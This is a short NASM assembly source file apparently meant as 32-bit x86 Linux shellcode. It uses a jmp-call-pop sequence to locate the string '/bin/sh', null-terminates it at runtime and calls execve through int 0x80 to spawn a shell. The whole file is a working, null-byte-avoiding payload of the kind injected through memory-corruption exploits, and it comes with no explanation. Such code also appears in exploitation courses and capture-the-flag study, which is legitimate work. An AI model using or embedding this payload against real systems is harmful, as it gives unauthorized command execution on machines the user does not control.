BITS 32

%define shell '/bin/sh'
%strlen shlen shell

jmp bottom

top:
xor edx, edx
pop ebx
mov byte [ebx + shlen], dl
push edx
push ebx
mov ecx, esp
xor eax, eax
mov al, 0xb  ; SYS_execve
int 0x80

bottom:
call top
db shell
